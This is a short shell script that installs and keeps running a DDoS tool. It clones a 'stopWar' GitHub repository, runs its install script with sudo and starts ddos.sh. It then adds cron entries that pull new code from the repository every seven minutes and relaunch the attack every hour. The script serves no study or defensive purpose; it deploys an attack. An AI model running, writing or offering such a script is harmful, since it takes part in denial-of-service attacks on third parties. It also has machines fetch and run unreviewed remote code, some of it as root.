#!/bin/sh

set -e

sudo apt-get update
sudo apt-get upgrade -y
sudo apt-get install -y git

cd ~ && /usr/bin/git clone https://github.com/angelloGit/stopWar
cd stopWar
sudo ./install.sh
./ddos.sh

crontab - <<__EOFF
*/7 * * * * cd ~/stopWar/ && /usr/bin/git pull
31 * * * * ~/stopWar/ddos.sh
__EOFF
